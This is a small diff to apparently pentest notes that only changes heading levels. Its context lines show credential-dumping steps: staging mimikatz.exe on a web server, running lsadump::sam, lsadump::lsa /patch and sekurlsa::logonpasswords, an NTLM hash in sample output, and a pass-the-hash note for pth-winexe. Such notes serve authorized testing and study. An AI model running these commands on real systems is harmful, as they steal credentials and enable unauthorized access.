@@ -282,7 +282,7 @@ cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /var/www/html
 > </details>
 
 <details>
-  <summary><h2>2.1. Successful <code>lsadump::sam</code> example</h2></summary>
+  <summary><h3>2.1. Successful <code>lsadump::sam</code> example</h3></summary>
 
 ```cmd
 mimikatz # lsadump::sam
@@ -325,7 +325,7 @@ Supplemental Credentials:
 </details>
 
 <details>
-  <summary><h2>2.2. Successful <code>lsadump::lsa /patch</code> example</h2></summary>
+  <summary><h3>2.2. Successful <code>lsadump::lsa /patch</code> example</h3></summary>
 
 ```cmd
 mimikatz # lsadump::lsa /patch
@@ -360,7 +360,7 @@ NTLM : 5a2b1b78290d381def497905d467fcff
 </details>
 
 <details>
-  <summary><h2>2.3. Successful <code>sekurlsa::logonpasswords</code> example</h2></summary>
+  <summary><h3>2.3. Successful <code>sekurlsa::logonpasswords</code> example</h3></summary>
 
 ```cmd
 mimikatz # sekurlsa::logonpasswords
@@ -447,7 +447,7 @@ Microsoft Windows [Version 10.0.20348.1129]
 ```
 
 <details>
-  <summary><h2>3.3. Using  pth-winexe</h2></summary>
+  <summary><h3>3.3. Using  pth-winexe</h3></summary>
 
 - **Requires SMB1** to be enabled on target, otherwise `ERROR: Failed to open connection - NT_STATUS_CONNECTION_RESET`
 
